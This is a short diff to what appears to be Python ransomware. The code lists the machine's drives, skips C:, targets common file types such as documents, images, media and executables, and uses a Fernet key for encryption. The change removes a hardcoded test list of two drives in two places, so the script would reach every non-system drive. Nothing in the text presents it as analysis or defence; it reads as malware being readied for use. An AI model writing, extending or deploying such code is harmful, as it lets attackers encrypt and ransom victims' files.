@@ -20,7 +20,6 @@ Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\",""
 ### Removing C Drive ####
 if "C:" in Drives:
     Drives.remove("C:")
-Drives = ["E:","K:"]
 #### fileFormats ####
 fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
 ######################################################
@@ -61,7 +60,6 @@ encriptt = Fernet(key)
 Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\","").split()
 if "C:" in Drives:
     Drives.remove("C:")
-Drives = ["E:","K:"]
 #### File Formats ####
 fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
 #####################################################
